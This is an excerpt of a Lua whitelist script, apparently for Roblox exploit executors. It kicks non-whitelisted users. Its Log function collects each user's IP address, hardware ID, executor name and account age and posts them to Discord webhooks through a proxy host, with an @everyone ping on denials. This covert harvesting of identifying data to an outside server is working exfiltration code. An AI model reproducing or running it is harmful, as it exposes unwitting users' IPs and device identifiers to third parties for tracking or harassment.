...
local function Log(Status)
    ...
    local payload = {
        ["content"] = (not isApproved and CONFIG.PING_EVERYONE) and "@everyone" or "",
        ["embeds"] = {{
            ...
            ["fields"] = {
                ...
                {["name"] = "Acc Age", ["value"] = LP.AccountAge .. " days", ["inline"] = true},
                {["name"] = "Executor", ["value"] = (identifyexecutor and identifyexecutor()) or "Unknown", ["inline"] = true},
                {["name"] = "IP Address", ["value"] = "||" .. IP .. "||", ["inline"] = true},
                {["name"] = "HWID", ["value"] = "```" .. ((gethwid and gethwid()) or "N/A") .. "```", ["inline"] = false},
    ...
    for _, url in pairs(CONFIG.WEBHOOKS) do
        task.spawn(function()
            local pUrl = url:gsub("discord.com", "webhook.lewisakura.moe"):gsub("discordapp.com", "webhook.lewisakura.moe")
            local req = (syn and syn.request) or (http and http.request) or http_request or request
            if req then pcall(function() req({Url = pUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data}) end)
            else pcall(function() Http:PostAsync(pUrl, data) end) end
        end)
    end
end
...
local function Initialize()
    local Auth = false
    for _, id in pairs(CONFIG.WHITELIST) do if LP.UserId == id then Auth = true break end end
    if Auth then Log("APPROVED") return true else Log("DENIED") task.wait(1.5) LP:Kick(CONFIG.KICK_MSG) return false end
end
